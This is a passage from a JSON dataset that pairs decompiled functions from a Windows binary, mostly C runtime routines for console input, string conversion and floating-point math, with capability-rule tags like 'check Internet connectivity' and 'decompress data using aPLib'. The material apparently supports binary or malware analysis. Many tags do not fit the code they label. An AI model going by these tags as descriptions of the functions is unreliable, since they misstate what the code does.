&lpMode),  pcVar4 = lpBuffer\n                           ,  iVar6 == 0)) {\n                            var_1ch = var_1ch & 0xffffff00;\ncode_r0x00472e9f:\n                            pcVar4 = lpBuffer;\n                            iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                                              (hConsoleHandle, lpBuffer, uVar5, &lpNumberOfBytesRead, 0);\n                            if ((iVar6 != 0) && (uVar8 = lpNumberOfBytesRead,  lpNumberOfBytesRead <= arg_10h)) {\ncode_r0x00472ec2:\n                                uVar8 = iVar7 + uVar8;\n                                if (*(var_10h + 0x28 + *(var_8h * 4 + 0x6cd630)) < '\\0') {\n                                    if (var_1h == '\\x02') {\n                                        if (var_1ch == '\\0') {\n                                            uVar8 = fcn.004726d5(arg_8h, var_20h, uVar8 >> 1);\n                                        }\n                                        else {\n                                            uVar8 = fcn.00472a48(arg_8h, var_20h, uVar8 >> 1);\n                                        }\n                                    }\n                                    else {\n                                        uVar8 = fcn.004728f1(arg_8h, pcVar4, uVar8, arg_ch, arg_10h >> 1);\n                                    }\n                                }\n                                goto code_r0x00472e81;\n                            }\n                            iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            if (iVar7 != 5) {\n                                if (iVar7 == 0x6d) {\n                                    uVar8 = 0;\n                                    goto code_r0x00472e81;\n                                }\n                                goto code_r0x00472e77;\n                            }\n                            puVar2 = fcn.0043bcb5();\n                            *puVar2 = 9;\n                            puVar2 = fcn.0043bca2();\n                            *puVar2 = 5;\n                        }\n                        else {\n                            if (var_1h != '\\x02') goto code_r0x00472e9f;\n                            iVar6 = (*_sym.imp.KERNEL32.dll_ReadConsoleW)\n                                              (hConsoleHandle, lpBuffer, uVar5 >> 1, &lpNumberOfBytesRead, 0);\n                            if (iVar6 != 0) {\n                                uVar8 = lpNumberOfBytesRead * 2;\n                                goto code_r0x00472ec2;\n                            }\n                            iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x00472e77:\n                            fcn.0043bc5b(iVar7);\n                        }\n                    }\n                    uVar8 = 0xffffffff;\n                    arg_8h_00 = pcVar3;\ncode_r0x00472e81:\n                    fcn.0045d185(arg_8h_00);\n                    return uVar8;\n                }\n            }\n            puVar2 = fcn.0043bca2();\n            *puVar2 = 0;\n            puVar2 = fcn.0043bcb5();\n            *puVar2 = 0x16;\n            goto code_r0x00472f5e;\n        }\n    }\n    puVar2 = fcn.0043bca2();\n    *puVar2 = 0;\n    puVar2 = fcn.0043bcb5();\n    *puVar2 = 9;\ncode_r0x00472f5e:\n    fcn.0043bb3e();\n    return 0xffffffff;\n}\n",
        "token_count": 2318
    },
    "00472f6a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00472f6a(uint32_t *arg_8h, ushort *arg_ch, uint32_t arg_10h, uint arg_14h, uint32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    if (arg_ch == NULL) {\n        if (arg_10h != 0) {\ncode_r0x00472f87:\n            *(arg_1ch + 0x1c) = 1;\n            *(arg_1ch + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch);\n            return 0x16;\n        }\n    }\n    else {\n        if (arg_10h == 0) goto code_r0x00472f87;\n        *arg_ch = 0;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = 0;\n    }\n    uVar2 = arg_10h;\n    if (arg_18h <= arg_10h) {\n        uVar2 = arg_18h;\n    }\n    if (0x7fffffff < uVar2) {\n        uVar3 = 0x16;\ncode_r0x00473010:\n        *(arg_1ch + 0x18) = uVar3;\n        *(arg_1ch + 0x1c) = 1;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch);\n        return uVar3;\n    }\n    iVar1 = fcn.00473046(arg_ch, arg_14h, uVar2, arg_1ch);\n    if (iVar1 == -1) {\n        if (arg_ch != NULL) {\n            *arg_ch = 0;\n        }\n        if (*(arg_1ch + 0x1c) == '\\0') {\n            return 0;\n        }\n        return *(arg_1ch + 0x18);\n    }\n    uVar2 = iVar1 + 1;\n    if (arg_ch != NULL) {\n        if (arg_10h < uVar2) {\n            if (arg_18h != 0xffffffff) {\n                *arg_ch = 0;\n                uVar3 = 0x22;\n                goto code_r0x00473010;\n            }\n            uVar3 = 0x50;\n            uVar2 = arg_10h;\n        }\n        arg_ch[uVar2 - 1] = 0;\n    }\n    if (arg_8h == NULL) {\n        return uVar3;\n    }\n    *arg_8h = uVar2;\n    return uVar3;\n}\n",
        "token_count": 633
    },
    "00473046": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00473046(uint16_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t arg_18h;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_18h;\n    uint32_t var_14h;\n    uint8_t *var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    arg_18h = arg_14h;\n    uStack8 = 0xffffffff;\n    uStack12 = 0x47a50f;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x6cade0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_8h != NULL) {\n        uVar4 = 0;\n        if (arg_10h == 0) goto code_r0x004731f8;\n        *arg_8h = 0;\n    }\n    if (arg_ch == NULL) {\n        *(arg_14h + 0x1c) = 1;\n        *(arg_14h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_14h);\n    }\n    else {\n        if (*(arg_14h + 0x14) == '\\0') {\n            fcn.00453bd0(uVar3);\n        }\n        if (*(*(arg_18h + 0xc) + 8) == 0xfde9) {\n            var_18h = 0;\n            var_14h = 0;\n            uVar4 = fcn.0046cd9f(arg_8h, &arg_ch, arg_10h, &var_18h, arg_18h);\n            goto code_r0x004731f8;\n        }\n        iVar5 = *(*(arg_18h + 0xc) + 0xa8);\n        if (arg_8h == NULL) {\n            if (iVar5 == 0) {\n                puVar1 = arg_ch + 1;\n                do {\n                    uVar2 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                } while (uVar2 != 0);\n                uVar4 = arg_ch - puVar1;\n                goto code_r0x004731f8;\n            }\n            iVar5 = fcn.004630d8(*(*(arg_18h + 0xc) + 8), 9, arg_ch, 0xffffffff, 0, 0);\n            if (iVar5 != 0) goto code_r0x004731f7;\n            *(arg_18h + 0x1c) = 1;\n            *(arg_18h + 0x18) = 0x2a;\n        }\n        else {\n            if (iVar5 == 0) {\n                uVar4 = 0;\n                if (arg_10h != 0) {\n                    do {\n                        *arg_8h = arg_ch[uVar4];\n                        if (arg_ch[uVar4] == 0) break;\n                        uVar4 = uVar4 + 1;\n                        arg_8h = arg_8h + 1;\n                    } while (uVar4 < arg_10h);\n                }\n                goto code_r0x004731f8;\n            }\n            iVar5 = fcn.004630d8(*(*(arg_18h + 0xc) + 8), 9, arg_ch, 0xffffffff, arg_8h, arg_10h);\n            if (iVar5 != 0) {\ncode_r0x004731f7:\n                uVar4 = iVar5 - 1;\n                goto code_r0x004731f8;\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_10h = arg_ch;\n            uVar3 = arg_10h;\n            if (iVar5 == 0x7a) {\n                while (uVar3 != 0) {\n                    var_14h = uVar3 - 1;\n                    if (*var_10h == 0) break;\n                    if ((*(**(arg_18h + 0xc) + *var_10h * 2) < 0) && (var_10h = var_10h + 1,  *var_10h == 0))\n                    goto code_r0x0047314e;\n                    var_10h = var_10h + 1;\n                    uVar3 = var_14h;\n                }\n                uVar4 = fcn.004630d8(*(*(arg_18h + 0xc) + 8), 1, arg_ch, var_10h - arg_ch, arg_8h, arg_10h);\n                if (uVar4 != 0) goto code_r0x004731f8;\n            }\ncode_r0x0047314e:\n            *(arg_18h + 0x1c) = 1;\n            *(arg_18h + 0x18) = 0x2a;\n            *arg_8h = 0;\n        }\n    }\n    uVar4 = 0xffffffff;\ncode_r0x004731f8:\n    *in_FS_OFFSET = var_ch;\n    return uVar4;\n}\n",
        "token_count": 1231
    },
    "0047342e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nfloat10 fcn.0047342e(double param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_14h;\n    double dVar6;\n    double dVar7;\n    uchar in_XMM0 [16];\n    double dVar8;\n    double dVar9;\n    double dVar10;\n    double dVar11;\n    double dStack12;\n    \n    iVar4 = 0;\n    while( true ) {\n        uVar2 = SUB162(in_XMM0 >> 0x30, 0) >> 4;\n        dVar6 = SUB168(in_XMM0, 0) & *0x483730 | *0x4837a0;\n        dVar7 = SUB168(in_XMM0, 0) & *0x483738 | *0x4837a8;\n        uVar1 = SUB82(*0x483750 + dVar6, 0) & 0x7f0;\n        dVar11 = *0x483768 & dVar7;\n        dVar9 = (*0x483760 & dVar6) * *(uVar1 + 0x483de0) - *0x483740;\n        dVar6 = (dVar6 - (*0x483760 & dVar6)) * *(uVar1 + 0x483de0);\n        dVar8 = (dVar7 - dVar11) * *(uVar1 + 0x483de8);\n        dVar7 = dVar6 + dVar9;\n        dVar11 = dVar8 + (dVar11 * *(uVar1 + 0x483de8) - *0x483748);\n        uVar3 = uVar2 - 1;\n        if (uVar3 < 0x7fe) {\n            iVar4 = (uVar2 - 0x3ff) + iVar4;\n            dVar10 = iVar4;\n            iVar5 = 0;\n            if (uVar1 + iVar4 * 0x400 == 0) {\n                iVar5 = 0x10;\n            }\n            return ((*0x4837f8 * dVar11 + *0x483808) * dVar11 + *0x483818) * dVar11 * dVar11 +\n                   ((*0x4837f0 * dVar7 + *0x483800) * dVar7 + *0x483810) * dVar7 * dVar7 * dVar7 * dVar7 * dVar7 +\n                   *0x483820 * dVar7 + *(uVar1 + 0x4839d8) + dVar10 * *0x483778 + (dVar8 & *(iVar5 + 0x483788)) +\n                   *(uVar1 + 0x4839d0) + dVar9 + dVar10 * *0x483770 + (dVar6 & *(iVar5 + 0x483780));\n        }\n        dStack12 = -(*0x4837b0 == param_1);\n        if (SUB82(dStack12, 0) != 0) break;\n        if (uVar3 != 0xffffffff) {\n            if (uVar3 < 0x7ff) {\n                if (*0x4837a0 == (param_1 & *0x483730 | *0x4837a0)) {\n                    return *0x4837d8;\n                }\n                arg_14h = 0x3e9;\n                dStack12 = *0x483730;\n            }\n            else if (((uVar2 & 0x7ff) < 0x7ff) || ((SUB84(param_1, 0) | param_1 >> 0x20 & 0xfffff) == 0)) {\n                dStack12 = -NAN;\n                arg_14h = 9;\n            }\n            else {\n                arg_14h = 0x3e9;\n            }\n            goto code_r0x0047363a;\n        }\n        in_XMM0 = CONCAT88(dVar11, param_1 * *0x4837c0);\n        iVar4 = -0x34;\n    }\n    arg_14h = 8;\n    dStack12 = *0x4837d0;\ncode_r0x0047363a:\n    fcn.00473d03(&param_1, &param_1, &dStack12, arg_14h);\n    return dStack12;\n}\n",
        "token_count": 1006
    },
    "004755b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004755b3(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    if (((arg_ch._2_2_ & 0x7ff8) == 0x7ff0) && (((arg_ch & 0x7ffff) != 0 || (arg_8h != 0)))) {\n        return true;\n    }\n    return (arg_ch._2_2_ & 0x7ff8) == 0x7ff8;\n}\n",
        "token_count": 110
    },
    "00476f60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.00476f60(void)\n\n{\n    uint32_t uVar1;\n    float10 in_ST0;\n    uint32_t uStack28;\n    uint16_t uStack24;\n    \n    if (1 < *0x6ccba8) {\n        return in_ST0;\n    }\n    uStack28 = in_ST0 >> 0x20;\n    uStack24 = in_ST0 >> 0x40;\n    uStack24 = uStack24 & 0x7fff;\n    uVar1 = in_ST0 < 0;\n    if (uStack24 < 0x3fff) {\n        return 0;\n    }\n    if (uStack28 < 0) {\n        if (uStack24 < 0x401e) {\n            return (uStack28 >> (0x3eU - uStack24 & 0x1f) ^ -uVar1) + uVar1;\n        }\n        if (((uStack24 < 0x401f) && (uVar1 != 0)) && (uStack28 == 0x80000000)) {\n            return uStack28;\n        }\n    }\n    return 0x80000000;\n}\n",
        "token_count": 262
    },
    "004770be": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.004770be(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    unkint10 in_ST0;\n    ulong uStack32;\n    uint16_t uStack24;\n    \n    uStack32._0_4_ = in_ST0;\n    uStack32._4_4_ = in_ST0 >> 0x20;\n    uStack32 = in_ST0;\n    uStack24 = in_ST0 >> 0x40;\n    uStack24 = uStack24 & 0x7fff;\n    if (uStack24 < 0x3fff) {\n        return 0;\n    }\n    if (uStack32._4_4_ < 0) {\n        if (uStack24 < 0x403e) {\n            uVar2 = 0x3e - uStack24;\n            uVar3 = uStack32._4_4_;\n            if (0x1f < uVar2) {\n                uVar3 = 0;\n                uStack32._0_4_ = uStack32._4_4_;\n            }\n            uVar1 = uStack32 >> (uVar2 & 0x1f) | uVar3 << 0x20 - (uVar2 & 0x1f);\n            uVar3 = uVar3 >> (uVar2 & 0x1f);\n            if (in_ST0 < 0) {\n                bVar4 = uVar1 != 0;\n                uVar1 = -uVar1;\n                uVar3 = -(uVar3 + bVar4);\n            }\n            return CONCAT44(uVar3, uVar1);\n        }\n        if (((uStack24 < 0x403f) && ((uStack32._4_4_ * 2 | uStack32) == 0)) && (in_ST0 < 0)) {\n            return uStack32;\n        }\n    }\n    return 0x8000000000000000;\n}\n",
        "token_count": 457
    },
    "00450330": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00450330(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t **ppuVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    char cVar5;\n    uint32_t uVar6;\n    \n    ppuVar2 = param_1[4];\n    param_1[4] = ppuVar2 + 1;\n    puVar3 = *ppuVar2;\n    if ((puVar3 == NULL) || (iVar4 = *(puVar3 + 2),  iVar4 == 0)) {\n        uVar6 = 6;\n        param_1[0xc] = \"(null)\";\n    }\n    else {\n        cVar5 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n        param_1[0xc] = iVar4;\n        uVar1 = *puVar3;\n        uVar6 = uVar1;\n        if (cVar5 != '\\0') {\n            *(param_1 + 0xe) = 1;\n            uVar6 = uVar1 >> 1;\n            goto code_r0x0045038a;\n        }\n    }\n    *(param_1 + 0xe) = 0;\ncode_r0x0045038a:\n    param_1[0xd] = uVar6;\n    return CONCAT31(uVar6 >> 8, 1);\n}\n",
        "token_count": 334
    },
    "00450393": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00450393(uint *param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint16_t *var_4h;\n    \n    var_4h = NULL;\n    cVar4 = fcn.0043eb40(&var_4h);\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.0044ac12();\n    puVar3 = var_4h;\n    if (cVar4 == '\\0') {\n        return 1;\n    }\n    if ((var_4h == NULL) || (iVar2 = *(var_4h + 2),  iVar2 == 0)) {\n        uVar5 = 6;\n        param_1[0xc] = \"(null)\";\n    }\n    else {\n        cVar4 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n        param_1[0xc] = iVar2;\n        uVar1 = *puVar3;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xe) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x00450403;\n        }\n    }\n    *(param_1 + 0xe) = 0;\ncode_r0x00450403:\n    param_1[0xd] = uVar5;\n    return 1;\n}\n",
        "token_count": 371
    },
    "0045040d": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045040d(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t **ppuVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    char cVar5;\n    uint32_t uVar6;\n    \n    ppuVar2 = param_1[4];\n    param_1[4] = ppuVar2 + 1;\n    puVar3 = *ppuVar2;\n    if ((puVar3 == NULL) || (iVar4 = *(puVar3 + 2),  iVar4 == 0)) {\n        uVar6 = 6;\n        param_1[0xc] = \"(null)\";\n    }\n    else {\n        cVar5 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n        param_1[0xc] = iVar4;\n        uVar1 = *puVar3;\n        uVar6 = uVar1;\n        if (cVar5 != '\\0') {\n            *(param_1 + 0xe) = 1;\n            uVar6 = uVar1 >> 1;\n            goto code_r0x00450467;\n        }\n    }\n    *(param_1 + 0xe) = 0;\ncode_r0x00450467:\n    param_1[0xd] = uVar6;\n    return CONCAT31(uVar6 >> 8, 1);\n}\n",
        "token_count": 333
    },
    "00450470": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00450470(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t **ppuVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    char cVar5;\n    uint32_t uVar6;\n    \n    ppuVar2 = param_1[4];\n    param_1[4] = ppuVar2 + 1;\n    puVar3 = *ppuVar2;\n    if ((puVar3 == NULL) || (iVar4 = *(puVar3 + 2),  iVar4 == 0)) {\n        uVar6 = 6;\n        param_1[0xc] = \"(null)\";\n    }\n    else {\n        cVar5 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n        param_1[0xc] = iVar4;\n        uVar1 = *puVar3;\n        uVar6 = uVar1;\n        if (cVar5 != '\\0') {\n            *(param_1 + 0xe) = 1;\n            uVar6 = uVar1 >> 1;\n            goto code_r0x004504ca;\n        }\n    }\n    *(param_1 + 0xe) = 0;\ncode_r0x004504ca:\n    param_1[0xd] = uVar6;\n    return CONCAT31(uVar6 >> 8, 1);\n}\n",
        "token_count": 332
    },
    "004504d3": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.004504d3(uint *param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint16_t *var_4h;\n    \n    var_4h = NULL;\n    cVar4 = fcn.0043ec25(&var_4h);\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.0044ac28();\n    puVar3 = var_4h;\n    if (cVar4 == '\\0') {\n        return 1;\n    }\n    if ((var_4h == NULL) || (iVar2 = *(var_4h + 2),  iVar2 == 0)) {\n        uVar5 = 6;\n        param_1[0xc] = \"(null)\";\n    }\n    else {\n        cVar4 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n        param_1[0xc] = iVar2;\n        uVar1 = *puVar3;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xe) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x00450543;\n        }\n    }\n    *(param_1 + 0xe) = 0;\ncode_r0x00450543:\n    param_1[0xd] = uVar5;\n    return 1;\n}\n",
        "token_count": 372
    },
    "0045054d": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045054d(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t **ppuVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    char cVar5;\n    uint32_t uVar6;\n    \n    ppuVar2 = param_1[4];\n    param_1[4] = ppuVar2 + 1;\n    puVar3 = *ppuVar2;\n    if ((puVar3 == NULL) || (iVar4 = *(puVar3 + 2),  iVar4 == 0)) {\n        uVar6 = 6;\n        param_1[0xc] = \"(null)\";\n    }\n    else {\n        cVar5 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n        param_1[0xc] = iVar4;\n        uVar1 = *puVar3;\n        uVar6 = uVar1;\n        if (cVar5 != '\\0') {\n            *(param_1 + 0xe) = 1;\n            uVar6 = uVar1 >> 1;\n            goto code_r0x004505a7;\n        }\n    }\n    *(param_1 + 0xe) = 0;\ncode_r0x004505a7:\n    param_1[0xd] = uVar6;\n    return CONCAT31(uVar6 >> 8, 1);\n}\n",
        "token_count": 335
    },
    "004505b0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004505b0(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t **ppuVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    char cVar5;\n    uint32_t uVar6;\n    \n    ppuVar2 = param_1[4];\n    param_1[4] = ppuVar2 + 1;\n    puVar3 = *ppuVar2;\n    if ((puVar3 == NULL) || (iVar4 = *(puVar3 + 2),  iVar4 == 0)) {\n        uVar6 = 6;\n        param_1[0xc] = \"(null)\";\n    }\n    else {\n        cVar5 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n        param_1[0xc] = iVar4;\n        uVar1 = *puVar3;\n        uVar6 = uVar1;\n        if (cVar5 != '\\0') {\n            *(param_1 + 0xe) = 1;\n            uVar6 = uVar1 >> 1;\n            goto code_r0x0045060a;\n        }\n    }\n    *(param_1 + 0xe) = 0;\ncode_r0x0045060a:\n    param_1[0xd] = uVar6;\n    return CONCAT31(uVar6 >> 8, 1);\n}\n",
        "token_count": 335
    },
    "00450613": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00450613(uint *param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint16_t *var_4h;\n    \n    var_4h = NULL;\n    cVar4 = fcn.0043ed0a(&var_4h);\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.0044ac3e();\n    puVar3 = var_4h;\n    if (cVar4 == '\\0') {\n        return 1;\n    }\n    if ((var_4h == NULL) || (iVar2 = *(var_4h + 2),  iVar2 == 0)) {\n        uVar5 = 6;\n        param_1[0xc] = \"(null)\";\n    }\n    else {\n        cVar4 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n        param_1[0xc] = iVar2;\n        uVar1 = *puVar3;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xe) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x00450683;\n        }\n    }\n    *(param_1 + 0xe) = 0;\ncode_r0x00450683:\n    param_1[0xd] = uVar5;\n    return 1;\n}\n",
        "token_count": 373
    },
    "0045068d": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045068d(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t **ppuVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    char cVar5;\n    uint32_t uVar6;\n    \n    ppuVar2 = param_1[4];\n    param_1[4] = ppuVar2 + 1;\n    puVar3 = *ppuVar2;\n    if ((puVar3 == NULL) || (iVar4 = *(puVar3 + 2),  iVar4 == 0)) {\n        uVar6 = 6;\n        param_1[0xc] = \"(null)\";\n    }\n    else {\n        cVar5 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n        param_1[0xc] = iVar4;\n        uVar1 = *puVar3;\n        uVar6 = uVar1;\n        if (cVar5 != '\\0') {\n            *(param_1 + 0xe) = 1;\n            uVar6 = uVar1 >> 1;\n            goto code_r0x004506e7;\n        }\n    }\n    *(param_1 + 0xe) = 0;\ncode_r0x004506e7:\n    param_1[0xd] = uVar6;\n    return CONCAT31(uVar6 >> 8, 1);\n}\n",
        "token_count": 335
    },
    "004506f0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004506f0(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t **ppuVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    char cVar5;\n    uint32_t uVar6;\n    \n    ppuVar2 = param_1[4];\n    param_1[4] = ppuVar2 + 1;\n    puVar3 = *ppuVar2;\n    if ((puVar3 == NULL) || (iVar4 = *(puVar3 + 2),  iVar4 == 0)) {\n        uVar6 = 6;\n        param_1[0xc] = \"(null)\";\n    }\n    else {\n        cVar5 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n        param_1[0xc] = iVar4;\n        uVar1 = *puVar3;\n        uVar6 = uVar1;\n        if (cVar5 != '\\0') {\n            *(param_1 + 0xe) = 1;\n            uVar6 = uVar1 >> 1;\n            goto code_r0x0045074a;\n        }\n    }\n    *(param_1 + 0xe) = 0;\ncode_r0x0045074a:\n    param_1[0xd] = uVar6;\n    return CONCAT31(uVar6 >> 8, 1);\n}\n",
        "token_count": 335
    },
    "00450753": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00450753(uint *param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint16_t *var_4h;\n    \n    var_4h = NULL;\n    cVar4 = fcn.0043edf0(&var_4h);\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.0044ac54();\n    puVar3 = var_4h;\n    if (cVar4 == '\\0') {\n        return 1;\n    }\n    if ((var_4h == NULL) || (iVar2 = *(var_4h + 2),  iVar2 == 0)) {\n        uVar5 = 6;\n        param_1[0xc] = \"(null)\";\n    }\n    else {\n        cVar4 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n        param_1[0xc] = iVar2;\n        uVar1 = *puVar3;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xe) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004507c3;\n        }\n    }\n    *(param_1 + 0xe) = 0;\ncode_r0x004507c3:\n    param_1[0xd] = uVar5;\n    return 1;\n}\n",
        "token_count": 374
    },
    "004507cd": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
